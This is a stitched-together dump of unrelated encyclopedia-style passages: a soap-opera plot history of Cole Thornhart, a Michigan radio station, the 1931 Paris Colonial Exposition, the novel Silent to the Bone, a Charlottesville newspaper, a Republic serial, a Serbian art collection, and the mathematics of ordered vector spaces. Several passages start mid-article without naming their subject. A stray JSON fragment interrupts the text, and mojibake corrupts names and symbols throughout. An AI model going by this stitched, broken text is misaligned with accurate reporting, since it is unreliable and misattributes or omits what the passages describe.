intriguing. Britney then discussed her feelings and emotions with Cole, as she explained how she supposedly understood Starr's situation. She then stated that she has had her own share of difficulties, as her parents were struggling with their long-time marriage. All were buying into the dramatic sob story, except for Langston, whom knew the truth. Cole generously gave Britney a shoulder to cry on, letting her hug him for support. As Starr reached the school, she witnessed Cole and Britney getting fairly close. Langston stated, that although Cole wasn't her favorite person, it would be harsh to see Britney steal away the guy that Starr likes. Starr then agreed, as she said that she'd do anything in order to not lose Cole. While waiting for Cole's presence nearby, Britney rushed up to Starr in the hall, presenting her with the card that she had created, out of the \\"goodness\\" of her heart. Surprised, Starr received the card and thanked her for it. Noticing that Cole was by his locker, Britney eagerly tried to steal all the attention away from Starr, creating a conversation with him, in order to make Starr jealous. Annoyed, Starr sarcastically excused herself while pushing Britney out of the way. Starr then came onto Cole and began making-out with him in front of all. After the kiss, Cole and Starr fled away from the high school. They decided to run to the nearby park and discuss what happened back at school. Cole claimed that he wasn't quite sure why Starr suddenly jumped him like that in public. Starr then reacted, by stating that no one was around now, as she then kissed him once more. Cole then claimed that though it was nice and he liked it, it didn't seem like Starr was acting as her normal self. Cole questioned her for acting the way she did, though Starr would not answer. Embarrassed, Starr walked away trying to forget what had just happened moments ago. She second- guessed what had happened in the hall that day and kept on apologizing. As she tried to walk away, Cole stopped her, asking for the true reason she's acting in such a matter. Hesitantly, Starr claimed that it was because of Britney and how she was trying to steal him away from her. Cole smirked, then explained how Starr never had to change, in order to grab his attention. He then stated that Starr was the type of girl who never cared about Britney and that she was better than that. When Britney officially found out the two were a couple and made it her mission to break them up. Marcie McBain, a teacher of Starr's tried to separate both of them, stating that it was the best thing. Starr and Cole wanted to see each other without all the drama involving Britney and Mrs. McBain, so they 'staged' a fake break-up. After the \\"break-up\\" Langston told Starr none of it was believable... as Britney still had other plans to make their lives miserable. They continued to see each other. When the McBains asked Starr to babysit Tommy on the night Nelly Furtado was performing at Capricorn, Starr happily agreed. Michael hesitated, wondering if it were right to leave Starr alone with Tommy for a few hours, but eventually gave in. When Marcie and Michael left, Starr then sent a text message to Cole, asking him to come over. When Cole arrived at the apartment, Starr was quite impressed with his ability to interact with Tommy so well. Cole began reciting poems, in which his father used to read to him before he went to sleep. Surprisingly, Cole's poems worked and Tommy fell asleep. In order to pass the time by, Starr and Cole decided to watch a movie. Halfway through the movie, things began to slowly heat up; Cole started leaning in closer towards Starr, though she wasn't quite sure how to react. As he continuously approached her, Starr noticed what Cole was trying to do, slightly chuckling before leaning in for a soft kiss. Within a matter of time, the delicate kiss turned into make-out madness between the two. As they kept making out, all was going well‚Äî until the phone rang. Without hesitating, Starr pushed Cole off her and ran for the phone. To her surprise, it was Marcie calling asking if Tommy was behaving. After finishing her conversation with Marcie, Starr began acting awkward towards Cole, who noticed that she wasn't her normal self and he asked her to take a seat on the couch beside him. Both silent, Starr and Cole avoided looking at each other. Cole then asked if they could discuss what had just happened in the living room. He questioned what would've happened if the phone hadn't have rung. He wondered if they would have gone further than just kissing. While trying to get away from their parents and spend time together, Starr and Cole became stuck in the Llantano Mountain Lodge where they ended up sharing a room together. While they were in this room, Starr came to the decision that she was ready to go all the way with Cole. In the process of 'hooking up' Starr decided that she was not ready to go all the way and Cole understood, and they spent the night together. Starr and Cole were caught by Marty in the hotel room after Britney ratted them out via-cell phone. Marty found a condom that had been left by Cole and assumed the worst. In late March, Starr and Cole had plans to run away together. In April, Starr broke up with Cole due to her father nearly choking Cole to death. Starr stated that it was for Cole's and Todd's safety. Britney tried to worm her way back into Cole's favor by signing up for the school play, which Cole already signed up for. After being miserable because of not being with his one true love, Cole reunited with Starr at the prom. After some convincing, he now has his mother's permission to date Starr. Blair, however, refused to allow Cole and Starr to be together. Cole and Starr were finally happy after all the trouble of being broken up and they were finally together. Cole went in the storage and found out Miles Laurence was holding Todd there, drugged with a stab wound. Cole was going to go to the police to tell them that Miles has Todd locked up in storage, but Miles played the tape that was keeping Marty out of jail, and threatened Cole if he told the cops about where Todd is. However, Britney found out about Cole knowing about Todd's whereabouts. Cole was sick of keeping this secret so he told Marty about Miles keeping Todd in their storage room; Marty revealed to Cole that she killed Spencer Truman. Marty turned herself in for the murder, while Cole told Bo and John that Miles is the one keeping Todd missing; Starr overheard the entire reveal and became upset with him. Cole went to see Starr to plead his case and she wouldn't hear it. Starr told Cole that it was the end of them and that she hated Cole for lying and keeping the whereabouts of her father in secret. Starr later forgave Cole for lying and they made up. Todd told Cole that he would never like him, but if he didn't tolerate him Starr would hate him forever, which led to them having a common understanding of each other. Marty was finally released from prison when it was revealed that it was actually Lindsay Rappaport who has murdered Truman. In November, Cole gets kidnapped as John, Todd, Blair, and Marty go looking for Marcie and Todd's son. After Marty and John open up to each other and make love, she gets kidnapped and is found with her son in Ireland. After trying to escape John and Ramsey, a member of the FBI tried making a deal to get them home safely. Ramsey shoots the van's tires out and the van plummets over the edge of a cliff; Cole is thrown from the van and Marty is stuck inside. As John tries to free Marty, she forces him to find Cole because she is nothing without her son. As John saves Cole, the van explodes with Marty still held inside; she is later presumed dead. Cole and John then return to Llanview and Cole arrives at Starr's, who was ecstatic to see he is home and okay. Cole starts crying and tells Starr his mother is dead. While walking alone, Cole wondered onto the docks where John and Ramsey were fighting. He overhears that Ramsey caused his mother's death. When Cole threatens to shoot Ramsey, Miles Laurence wonders onto the scene and is accidentally shot in the chest by Cole. After Miles falls into the water, Cole and Ramsey flee the scene. A panicked Cole rushes to Starr's house, fearing that he killed Miles. Cole escapes just as Ramsey arrived at the house and searched Starr's room. Cole ran off to Langston's old house to avoid being caught. The next day Starr goes to the house and meets up with Cole. Later he decides to confess to shooting Miles, much to Starr's disliking. Once at the hospital, Cole runs into John and tells him what he wants to do. John convinces him to leave and not say another word about it. Cole and Langston attend group therapy together in January. They decide to surprise Starr with a sweet sixteen party. Starr jumps to conclusion that her best friend and her boyfriend are hooking up. She decides to confront them outside of UltraViolet, where she thinks they are attending a concert. She barges into the club and realizes it's a birthday party for her. She apologizes to Cole and Langston. In March, Todd decides to move his family to Hawaii to keep his family safe from Ramsey's threats. Although Starr believes it's because he wants her and Cole to break up. Cole and Starr decide to sneak off to Langston's old house to spend one last night together. They decide they want to make love for the first time that night. Todd barges in and sees them in bed together and attempts to kill Cole. A few weeks later, Starr finds out she's pregnant. She decides to keep the information from Cole, fearing for his safety. She runs off to Atlantic City to get an abortion. Meanwhile, Cole manages to get Langston to tell him where Starr is. Cole gets there in time and Starr decides not to get the abortion. Cole proposes they run away together so they can be family. They arrive in Virginia Beach and move into a motel. Later, they are found by Todd, Blair and John. Todd throws Starr down a flight of stairs, then beats up Cole until he is unconscious. They are rushed to the hospital, where John and Blair find out about Starr's pregnancy. They then return home. Starr tells Blair that she wants to have the baby but not take care of it. Replying she loves the baby and thinks that it should have more to offer then what she can give it. Blair tells her whatever she will support her with whatever choice she makes. On June 18, she tells Cole \\"That what is best for the baby is to have two parents that can love and take care of the baby. And that they are not ready to be parents. Cole, I'm giving the baby up for adoption after it's born.\\" Cole is heartbroken saying that Starr really doesn't love him. Starr wants Marcie to have the baby after it is born though she declines though hinted that she may reconsider. In early July, Cole decided to tell Todd that Starr's pregnant, and planning on giving the baby to the McBain's. Cole thinks about suing Starr for custody of his child. Cole decides to give up all his rights to his child. This leads to a breakup between them. When school starts up again, several boys make fun of Starr because of her pregnancy. Starr stands up for herself and Cole protects her telling the principal of the school, who wanted to kick her out, that if she kicks her out she better kick him out too, because he's the father of her baby. Starr gives birth to their daughter but because of Bess Lord, they think that their daughter is dead due to RH disease but she is being raised as Chloe Brennan. Starr tells Cole that they are incompatible as she is RH negative and he is RH positive. She makes the analogy that there is 'bad blood' in the family. 2008‚Äì10 In the new year/late 2008, Cole goes through a hard time. Although he has his mother, she changed by being held captive by Todd. From the loving mother he loved to a wild-stricken woman in a way not wanting anything to do with him. Heartbroken Cole goes by his mother's new personality, breaking up with Starr and the death of his daughter Hope Manning-McBain turns to drugs. He said not to turn back to drugs but he does making him a drug addict. When Starr finds out she tries to help but he shuns her. He then gets into a car accident while driving himself and Matthew Buchanan home, while he was high. The car crashed into Gigi Morasco and Shane Morasco. Cole was sent to rehab after the car accident and managed to get clean with the help of Starr. Both Starr and Cole begin investigating the mysterious death of their baby. DNA results reveal that the lock of hair inside Starr's locket is not from their baby. The baby's headstone gives her name as Hope Manning McBain. Marcie later finds out that neither Cole nor Starr were RH positive, and that's what they said the baby died from. Natalie Buchanan and Jared Banks soon discover that Chloe who they think is Jessica's baby is Starr's baby. Maurice later tells Starr that Hope had to have died of something else because her and Cole are both RH negative. Starr and Cole are about to receive the baby from Jessica. When they get Hope back from Jessica/Bess, Starr struggles with the decision to give up Hope or keep her. Starr eventually gives the baby to Michael and Marcie, but is clearly heartbroken by her decision. Starr and Cole start their relationship back up. Marcie realizes how difficult the decision to give away Hope was for Starr, and on June 15, she offers Starr the opportunity to raise the baby. Starr tearfully accepts and Marcie gives Hope to Starr, saying that she loves them both. Her name is now Hope Manning-Thornhart. On June 17, Cole is at the loading dock and while being there, Asher offers Cole more drugs but Cole refuses. As Asher leaves, he puts the drugs in Cole's shirt pocket. Cole decides to get rid of them by throwing it into the river but before he does so he is caught by a cop and is arrested. He is brought to court and the judge decides to put Cole in prison for possibly two years. On June 18, he goes to Dorian's mansion where he discovers that Starr has decided to raise their infant daughter. As Cole is visiting he tells Starr about the incident and decides to propose to Starr, she later accepts his proposal. Although not happy with their decision, Todd and Blair both give their consent to the marriage. Just as the pastor is about to announce them married, John McBain walks in to inform Cole that he will not have to go to prison if he co- operates in a sting operation to bring down the school drug dealer, Asher. Starr and Cole call the wedding off, deciding to wait. The day before Cole is supposed to go undercover, Starr proposes that Cole spend the night with her. The two make love and the next morning Cole says goodbye to Starr and Hope. He begins working undercover for the drug take down. John sets him up at an apartment, where Asher starts having their meetings. Asher introduces him to his boss, Serge. Starr and Cole accidentally meet up where Cole is doing his community service. Cole warns Starr not to say anything and that is when they fake an argument on when Cole can get money so Starr and Hope can move out. They share a passionate kiss and then Starr and Hope leave. Serge later makes a call to his boss. John and Bo continue working on Cole's undercover case. They begin buy receiving a tip that there is going to be a shipment that night coming into the docks. John realizes that the lord in the drug sales is Mayor Lowell. John then confides in Officer Oliver Fish about the undercover work. They then realize one of the officers is working for the Mayor. Dorian Lord is now the Lowell's campaign manager and financial ad visor. While they are in the process of working on the campaign he stops by her mansion. Starr is downstairs and he begins criticizing how children should not have children. Starr is highly offended, but Dorian snaps a photo of the mayor holding Hope and Starr looking upset. Dorian prints it on the front page of her newspaper, The Sun. Cole has a meeting with Serge and Asher. Since the drug shipment didn't arrive, Asher didn't have any drugs to sell to Justin Lowell, the mayor's son. Cole is forced to sell to Justin. Nobody realizes this but Todd Manning witnesses Cole selling the drugs. Todd takes a picture of the drug deal on his cell phone. Cole calls John and tells him that he had to sell to a teenager and give him a description of Justin. John later catches up with Justin and arrests him. Meanwhile, Todd goes to see Starr and tells her Cole is dealing drugs, using the picture as proof. In an attempt to keep her father from getting Cole into trouble, Starr is forced to reveal that he is working undercover with John. Dorian overhears their conversation from the foyer. The undercover officer that had been working for Mayor Lowell gets a very descriptive phone call. He is to go and kill Cole. John McBain and Officer Fish hear the phone call off on the recorded tape. The police officer, Keaton, has already headed downstairs to the cell block. Before he gets the chance to kill Cole, John shoots him. Serge gets the news from spying at the police department and heads straight to Mayor Lowell. Meanwhile, John makes Brody hold Cole in his office with a loaded gun ready to shoot whenever necessary. While this is happening, Serge walks into La Boulaie and points a gun at Todd and Starr. On November 25, Cole, Starr and Hope celebrate Thanksgiving as a family. Just before Starr's 18th birthday, Cole asks Starr if she and Hope will move in with him. After Starr and Blair convince Todd, she moves into Cole's apartment. In March 2010, Cole was heartbroken to learn that Marty had lost her baby with John, and then turned angry when he found out Marty had been pushed, possibly by Todd. Hannah O'Connor shocks Cole with her claim that she actually saw Todd push Marty down the stairs. In the high school gym, Todd claims that Hannah is a liar when Cole confronts him. Cole, filled with outrage, beats up Todd in front of Blair, Starr, Tea, Danielle and others. Brody shows up to arrest Cole. Marty races to Cole's side when she finds out he was arrested. Cole is released once again and goes to find Starr. He tries to avoid Hannah because she is the one that killed his mother's baby. Hannah said that Starr has moved on with James. Cole leaves town with Hannah to find Starr, this is a distraction that Hannah has used to keep him from discovering that she has Hope and Starr locked in her attic. Hannah takes every advantage of Cole's fragile state while Starr is gone. Eventually James finds Starr and Hope and Hannah tries to bury them alive, claiming she will still have Cole to herself. The police come upon them and Hannah is taken to jail. Cole thinks that Elijah Clarke has killed Starr and Hope in the warehouse. He is unaware that they were actually being held by Hannah and were now safe with James. Cole shoots and kills Eli while he is handcuffed to a police car. Marty witnesses the shooting and makes Cole run while she takes the blame. Cole is later reunited with Starr and his daughter. Meanwhile, Marty is arrested for Eli's murder. While in custody, Natalie runs forensic evidence on the gun and discovers Cole's fingerprints along with Marty's. She shows the results to John who resolves to bring Cole in. Cole later decides to turn himself in and take responsibility for his actions. After hearing testimony from Tea Delgado and Nora, the judge decides to be lenient with Cole and sentences him to ten years in Statesville Prison. Before he is taken to prison, Cole breaks up with Starr, telling her not to wait for him and to live her life the fullest she can. Starr refuses to accept this and promises to wait. In February, Starr realizes that Cole was right and she needs to move on. In February 2011 Starr goes to see Cole. She breaks up with him but promises to continue to support him as a friend while he serves his sentence. On June 3, 2011 it is revealed that Cole's father Patrick is alive. 2012 On January 3, 2012, during a blackout, Cole breaks out of Statesville and reunites with Starr and Hope. Cole begins to feel betrayed about Starr and James' happiness. Cole and Starr walk in on Hannah holding a gun to Sam Manning. Hannah aims to shoot Starr but Cole jumps in front of her and is shot in the shoulder. Cole later survived the shooting, but he soon faked his death so that he wouldn't have to go back to prison and so that he could finally reunite with his parents. Cole made his final appearance on January 13, 2012, when Todd Manning sent him to his father and then sent him to be Starr Manning's bodyguard after briefly reuniting with his parents, so they can be together forever with their new family. Cole says \\"We can have our family now Hope, you and me.\\" Cole, Starr, and Hope arrived in Port Charles in February after their flight had been redirected, due to weather conditions that prevented them from returning to Llanview, after visiting Langston and Markko in California. Cole shares the history of the town with Starr, touching on the history of Luke and Laura and the Cassadines and then suggests that he and Starr get married, which Starr questions him about, claiming that according to the world, Cole Thornhart was dead and she does not wish to be Mrs. John Doe. As Starr stalls concerning the marriage proposal, mobster Anthony Zacchara crashes into their car, after his tires are blown out by Johnny Zacchara. Starr gets out of the car but Cole and Hope are still trapped inside. Before Michael and Dante can save them, the car topples off a cliff. The car explodes, and Cole and Hope are presumed dead among unrecognizable remains.  Possible Survival/Refuted Survival  On February 25, 2013, a mysterious figure watches Starr and Michael, as they grieve at Cole and Hope's gravesite. When they leave, the figure walks over and sadly looks down at their gravestone. It is heavily implied that it is Cole and he survived the accident, however, it remains unknown. On March 20, 2013, Starr receives a phone call from Langston, asking her to come back to California for an emergency. It is never revealed why Starr returned to California or why she did not return to Port Charles; it has been speculated that if Cole (and possibly Hope) survived, they would have met up with Starr back in Los Angeles and gone into hiding. No matter what the intentions of the writing staff of General Hospital were at the time, the thread of Cole (and possibly Hope) being alive will not be picked up by the new online reboot of One Life to Live. Executive producer Jennifer Pepperman had the following to say when discussing the opportunity to bring back the characters: :\\"I was really shocked as a viewer when Cole and Hope were killed and I know on soap operas people say you can bring people back from the dead, but that is something that I feel strongly, and Prospect Park feels strongly about, and that is not bringing people back from the dead. That is one of the things that never really feels right, but I am afraid that ABC killed Cole and Hope, and also Victor Jr. III (Tea and Victor Jr. son) and those are real losses for the show.\\"http://michaelfairmansoaps.com/news/oltls-ep-jennifer-pepperman-on- roger-howarths-todds-departure-listen-to-the-broadcast-toln-soaps-live-with- michael-fairman/2013/08/02/ Notes and references External links *Cole Thornhart profile - ABC.com *Cole Thornhart profile - SoapCentral.com Thornhart, Cole Thornhart, Cole Category:Television characters introduced in 2006 Category:Fictional murderers Category:Fictional teenage parents Category:Male characters in television Category:Fictional criminals on soap operas ","title":"Cole Thornhart"},{"id":"8099084","text":"WHYT is a non-commercial, contemporary Christian FM radio station licensed to serve Goodland Township and Imlay City, Michigan.

The French government brought people from the colonies to Paris and had them create native arts and crafts and perform in grandly scaled reproductions of their native architectural styles such as huts or temples.Leininger-Miller 55. Other nations participated in the event, including The Netherlands, Belgium, Italy, Japan, Portugal, the United Kingdom, and the United States. Politically, France hoped the exposition would paint its colonial empire in a beneficial light, showing the mutual exchange of cultures and the benefit of France's efforts overseas. This would thus negate German criticisms that France was \\"the exploiter of colonial societies [and] the agent of miscegenation and decadence\\". The exposition highlighted the endemic cultures of the colonies and downplayed French efforts to spread its own language and culture abroad, thus advancing the notion that France was associating with colonised societies, not assimilating them. The Colonial Exposition provided a forum for the discussion of colonialism in general and of French colonies specifically. French authorities published over 3,000 reports during the six- month period and held over 100 congresses. The exposition served as a vehicle for colonial writers to publicise their works, and it created a market in Paris for various ethnic cuisines, particularly North African and Vietnamese. Filmmakers chose French colonies as the subjects of their works. The Permanent Colonial Museum (today the Cit√© nationale de l'histoire de l'immigration) opened at the end of the exposition. The colonial service experienced a boost in applications. 26 territories of the empire participated in the Colonial Exposition Issue of postage stamps issued in conjunction with the Exposition.

As one of important colonial power at that time, the Dutch Empire participated in the Exhibition. The Netherlands presented a cultural synthesis from their colony; the Dutch East Indies (now Indonesia). However, on 28 June 1931, a fire burnt down the Dutch pavilion, along with all cultural objects displayed inside. Only a few artefacts could be salvaged; among others are ancient Javanese bronze Shiva statue, which is now kept in Indonesian National Museum. Until now, the cause of this massive fire is still in debate; short circuit, flammable building materials that was a fire hazzard, to the possibility of an arsonist sabotage, all become wild interpretation circulated at that time. The material and cultural lost was surely immense, estimated around almost 80 million franc. It was said that the French government obliged to paid for loss insurance to the Netherlands Indies colonial government. The money was then used for Bataviaasch Genootschap museum expansion.

Review quoted by Amazon: \\"Did the British nanny do it? ...\\". It has been recommended for ages 10 to 14. Publishers Weekly. Review quoted by Amazon. Origins The story is \\"loosely based on a real case\\". Summary Silent to the Bone is a first-person narrative by Connor Kane, a 13-year-old boy. Connor's best friend Branwell Zamborska is struck dumb and taken to the Juvenile Behavioral Center when his infant sister Nicole suffers a head injury and slips into a coma. The au pair Vivian, having completed Branwell's 9-1-1 call, asserts that Branwell must have dropped Nikki. Connor knows there is some explanation for Branwell's silence and that Branwell did not intentionally hurt Nikki. He knows that Branwell needs him and visits daily. Because Branwell does not speak, Connor does all the talking and communicates by a kind of sign language, inspired by Jean-Dominique Bauby. \\"Remember the story of the paralyzed Frenchman who wrote a whole book with the blink of his left eye? I no sooner had the sentence out of mouth than Branwell blinked his eyes twice, very rapidly, and I knew he understood our rules of communication.\\" Silent to the Bone, first edition, p. 34. Initially he elicits clues by presenting keywords on handwritten cards, which leads to Connor writing the alphabet on the backs of these cards and pointing to the letters in order to form short phrases and eventually sentences. Connor recounts his daily visits to his older half-sister Margaret, after her workday, and together they work towards solving the mystery of why Branwell will not speak, and what happened to baby Nikki. Characters Everyone lives around the university campus in Epiphany, Clarion County, New York ‚Äî a fictional county in Greater New York. Branwell Zamborska, 13, is the son of Dr. Stefan Zamborska, a genetic biologist at the university, and Linda Branwell, deceased. Branwell is very honest, smart, caring and tall. His grandparents live in Naples, Florida. Branwell's immediate family now includes step-mother Tina Nguyen and half-sister Nicole or Nikki, a baby. For years after his mother's death, Vivian was his and Nikki's babysitter. The Zamborskas live on Tower Hill near the Kanes. Connor Kane, 13, is the son of Roderick Kane and his second wife. The Kanes live in a suburban housing development on Tower Hill. He and his half-sister Margaret like each other, but Margaret was never his babysitter, and they know each other from her semiformal visits. Connor and Branwell have been friends since nursery school and are now eighth grade students at the middle school downtown, where they commute by city bus. Margaret Kane, 27, is Connor's half-sister who runs a computer consulting business. When Margaret was Connor's age, their father Kane left Margaret's mother for Connor's. Margaret remains chilled by the experience. Connor's parents are not friendly with her, but they welcome her care for Connor after school and sometimes late into the night. \\"Call your mother and tell her you're having dinner at the Evil Empire,\\" she says to him one evening.Silent to the Bone, first edition, p. 79. Eventually she resorts to Dad's expertise as University Registrar Kane, regarding the Zamborska case; that and some prodding by Connor effect some warming between daughter and father. (Margaret is the protagonist of The Outcasts of 19 Schuyler Place (2004), a kind of prequel to Silent to the Bone.) Themes According to the School Library Journal review, the book contains \\"themes of communication, relationships in blended families, being different, friendship, adolescence, and shame\\".School Library Journal (2000).

It has been published daily, since September 14, 1892. The paper was founded by James Hubert Lindsay and his brother Frank Lindsay. The Progress was initially published six days a week; the first Sunday edition was printed in September 1968. Lindsay's family owned the paper for 78 years. On November 30, 1970, the family announced a sale to the Worrell Newspaper group, which took over on January 1, 1971. T.

The Progress immediately became the group's flagship paper, and Worrell moved his newspaper group headquarters to Charlottesville. Faced with major newspaper industry changes in 1995, Worrell sold his newspaper properties to Richmond- based Media General, which was later purchased by Nexstar Media Group, as a part of a larger $230M deal.

It was directed by William Witney and John English and is considered one of the better serials produced by Republic. The serial was the fourteenth of the sixty-six serials produced by the studio. Plot An escaped criminal, known as Harry Crowl, but preferring to be called by his prison number 39013 (pronounced Thirty Nine - Oh - Thirteen), seeks revenge on the man who sent him to prison, millionaire philanthropist Horace Granville. He kidnaps Granville, imprisoning him within his own house, and disguises himself to take Granville's place, as the frail old man in a clean room, necessary for his health, with the only other person allowed past the glass barrier being his doctor. He then sets about methodically destroying everything Granville owns. When we enter the film, he has already destroyed a number of Granville properties, and has set his sights on the Granville Amusement Centre, at which a trio of acrobats is performing. The daredevils, Gene, Bert, and Tiny escape but Gene's kid brother is badly wounded in the blaze, and later dies of his injuries. Seeking revenge they take jobs as private investigators for the man they believe to be Horace Granville. Through a series of deadly traps, and with the help of a mysterious cloaked figure, known only as \\"The Red Circle\\", the daredevils begin to unravel the truth. In the first chapter, we are introduced to all the above facts, and even shown the secret room within the Granville estates where 39013 is keeping the real Granville. He is kept in a cell, the exact duplicate of the one in which 39013 resided for his abruptly ended sentence. This room is trapped, so that in the event that 39013 does not return, a dripping reservoir will run dry. The loss of weight will tip the scale, causing deadly gas capsules to break upon the floor, killing Granville in a very short time.

It displays paintings and sculptures by 20th century Serbian and Yugoslav artists, mostly from the interwar period. The collection bears the name of its founder and contributor Pavle Beljanski, Serbian diplomat and art collector, who donated his collection of paintings, sculptures and tapestries to the Serbian people in November 1957. He continued to add works of art to this significant collection until his death. The collection consists of 185 works by 37 artists. The Pavle Beljanski Memorial Collection was opened to the public on 22 October 1961. History After the end of the World War II, Pavle Beljanski decided to donate his art collection to the people of Serbia. He did this is 1957, when he signed donation agreement with the Government of Vojvodina. The Memorial Collection is housed in building specifically designed by architect Ivo Kurtoviƒá for the purpose of housing the art collection. The building was built in 1961 and on 22 October that year it opened to public under the name of The Pavle Beljanski Memorial Collection. The great architectural value of the structure was achieved through the architect's precise evaluation of its specific requirements and the subsequent incorporation of these requirements into a functional whole. Permanent exhibition Bather (1929) by Jovan Bijeliƒá on 1969 Yugoslav stamp. This painting is part of the permanent exhibition. When Beljanski started collecting works of art, most of the artists whose works he collected were anonymous young people at the beginning of their careers. This underlined the importance of the willingness and ability of Pavle Beljanski to recognize quality and purchase works of art which would, in years to come, gain the most important place in studies of Serbian art of the first half of the 20th century. Pavle Beljanski's Memorial Hall opened in 1966 as a gift from Pavle Beljanski's heirs. It represents a reconstruction of his living and working space, with furniture, paintings, books, photographs, documents and many personal objects. It consists of portraits and self-portraits, as well as documented material about artists whose works are included in the collection (photographs, letters, personal documents and objects used by artists in the process of making art - brushes, paints, palettes). In his wish to help stimulate research on national art history, on May 27, 1965, Pavle Beljanski donated painting La Grande Iza by Vlaho Bukovac to the Memorial Collection, by the special contract of gift and on one condition ‚Äì the Collection was to establish The Pavle Beljanski Award for the best final student essay in this field, presented at the Art history department of the Belgrade University. The award was founded in 1967 and it is presented annually every October. In the year 2000, the Memorial Collection began presenting every awarded work with its own theme exhibition. Art collection Nade≈æda Petroviƒá - Belgrade Suburb (1908) This Memorial Collection consists mainly of the first-class works of Serbian art from the period between the first and the seventh decades of the 20th century, with an emphasis on the period between World War I and World War II. Therefore, the collection chronologically begins with the paintings of the first generation of Modernists (Nade≈æda Petroviƒá, Milan Milovanoviƒá, Kosta Miliƒçeviƒá), and continues with the works of the most esteemed representatives of Serbian art between the two World Wars (Sava ≈†umanoviƒá, Milan Konjoviƒá, Petar Dobroviƒá, Ivan Radoviƒá, Jovan Bijeliƒá, Petar Lubarda, Sreten Stojanoviƒá, Risto Stijoviƒá), and artists from the second half of 20th Century (Zora Petroviƒá, Liza Kri≈æaniƒá, ≈Ωivko Stojsavljeviƒá, Milenko ≈†erban, Ljubica Sokiƒá). The Memorial Collection is also equipped with a library and a large archive, containing various items such as sketches, paintings, sculptures, letters, documents, photographs and video tapes. Other exhibitions There are also theme exhibitions of artists represented in the collection, as well as phenomena in Serbian art of the early 20th Century. Apart from works of art, such exhibitions contain archival material such as drawings, photographs, catalogs, various documents and artists‚Äô personal objects. Every autumn, there is a three-month-long course for pre- school and grammar school students who want to find out more about the works of art and artists represented in The Memorial Collection, as well as about visual arts in general and about new trends and art techniques. After lectures in the form of conversations, students can choose one of the art techniques (drawing, graphic, painting, sculpting, mosaic) in which they will express their own impressions on works from the collection. The main goal of art workshops is to develop an artistic style as the basis for forming the future visual expression of every student. Every year, the Art workshop hosts about 50 students, ages 5 to 14, who create their own works of art through teamwork. Every year in December, there is an exhibition of children‚Äôs work. Concerts of classical music are often held in the Gallery‚Äôs acoustic hall, as well as various book promotions, press conferences, and other events. In cooperation with the Novi Sad Art Academy, several classes in Artistic Elements are held in the Memorial Collection. Through observing exhibited works, students study the relations between artistic elements, and by combining them, they create new works of art. Creative work is also attained through new technologies ‚Äì digital printing, video presentations, installations, computer animation ‚Äì which can help us study artistic phenomena of the 20th Century. Lectures held at the Memorial Collection have a goal to encourage the exchange of ideas and experience in different art techniques. An exhibition of graduate students‚Äô works has been held every year in May since 2001.

Given a preordered vector space X, the subset X + of all elements x in (X, ‚â§) satisfying x ‚â• 0 is a pointed convex cone with vertex 0 (i.e. it contains 0) called the positive cone of X and denoted by \\\\operatorname{PosCone} X. The elements of the positive cone are called positive. If x and y are elements of a preordered vector space (X, ‚â§), then x ‚â§ y if and only if y ‚àí x ‚àà X+. Given any pointed convex cone C with vertex 0, one may define a preorder ‚â§ on X that is compatible with the vector space structure of X by declaring for all x and y in X, that x ‚â§ y if and only if y ‚àí x ‚àà C; the positive cone of this resulting preordered vector space is C. There is thus a one-to-one correspondence between pointed convex cones with vertex 0 and vector preorders on X. If X is preordered then we may form an equivalence relation on X by defining x is equivalent to y if and only if x ‚â§ y and y ‚â§ x; if N is the equivalence class containing the origin then N is a vector subspace of X and X/N is an ordered vector space under the relation: A ‚â§ B if and only there exist a in A and b in B such that a ‚â§ b. A subset of C of a vector space X is called a proper cone if it is a convex cone of vertex 0 satisfying C ‚à© (‚àíC) = {0}. Explicitly, C is a proper cone if (1) C + C ‚äÜ C, (2) rC ‚äÜ C for all r > 0, and (3) C ‚à© (‚àíC) = {0}. The intersection of any non- empty family of proper cones is again a proper cone. Each proper cone C in a real vector space induces an order on the vector space by defining x ‚â§ y if and only if y ‚àí x ‚àà C, and furthermore, the positive cone of this ordered vector space will be C. Therefore, there exists a one-to-one correspondence between the proper convex cones of X and the vector partial orders on X. By a total vector ordering on X we mean a total order on X that is compatible with the vector space structure of X. The family of total vector orderings on a vector space X is in one-to-one correspondence with the family of all proper cones that are maximal under set inclusion. A total vector ordering cannot be Archimedean if its dimension, when considered as a vector space over the reals, is greater than 1. If R and S are two orderings of a vector space with positive cones P and Q, respectively, then we say that R is finer than S if P ‚äÜ Q.  Examples  The real numbers with the usual ordering form a totally ordered vector space. For all integers n ‚â• 0, the Euclidean space ‚Ñùn considered as a vector space over the reals with the lexicographic ordering forms a preordered vector space whose order is Archimedean if and only if n = 0 or 1.  Pointwise order  If S is any set and if X is a vector space (over the reals) of real-valued functions on S, then the pointwise order on X is given by, for all f, g ‚àà X, f ‚â§ g if and only if f(s) ‚â§ g(s) for all s in S. Spaces that are typically assigned this order include: *the space ùìÅ‚àû(S, ‚Ñù) of bounded real-valued maps on S. *the space c0(‚Ñù) of real-valued sequences that converge to 0. *the space C(S, ‚Ñù) of continuous real-valued functions on a topological space S. *for any non-negative integer n, the Euclidean space ‚Ñùn when considered as the space C({1, ..., n}, ‚Ñù) where S = {1, ..., n} is given the discrete topology. The space \\\\mathcal{L}^{\\\\infty}\\\\left( \\\\mathbb{R}, \\\\mathbb{R} \\\\right) of all measurable almost-everywhere bounded real-valued maps on ‚Ñù, where the preorder is defined for all f, g ‚àà \\\\mathcal{L}^{\\\\infty}\\\\left( \\\\mathbb{R}, \\\\mathbb{R} \\\\right) by f ‚â§ g if and only if f(s) ‚â§ g(s) almost everywhere.  Intervals and the order bound dual  An order interval in a preordered vector space is set of the form :[a, b] = {x : a ‚â§ x ‚â§ b}, :[a, b[ = {x : a ‚â§ x < b}, :]a, b] = {x : a < x ‚â§ b}, or :]a, b[ = {x : a < x < b}. From axioms 1 and 2 above it follows that x, y ‚àà [a, b] and 0 < Œª < 1 implies Œªx + (1 ‚àí Œª)y in [a, b]; thus these order intervals are convex. A subset is said to be order bounded if it is contained in some order interval. In a preordered real vector space, if for x ‚â• 0 then the interval of the form [‚àíx, x] is balanced. An order unit of a preordered vector space is any element x such that the set [‚àíx, x] is absorbing. The set of all linear functionals on a preordered vector space X that map every order interval into a bounded set is called the order bound dual of X and denoted by Xb. If a space is ordered then its order bound dual is a vector subspace of its algebraic dual. A subset A of an ordered vector space X is called order complete if for every non-empty subset B ‚äÜ A such that B is order bounded in A, both \\\\sup B and \\\\inf B exist and are elements of A. We say that an ordered vector space X is order complete is X is an order complete subset of X.  Examples  If (X, ‚â§) is a preordered vector space over the reals with order unit u, then the map p(x) := \\\\inf \\\\left\\\\\\\\{ t \\\\in 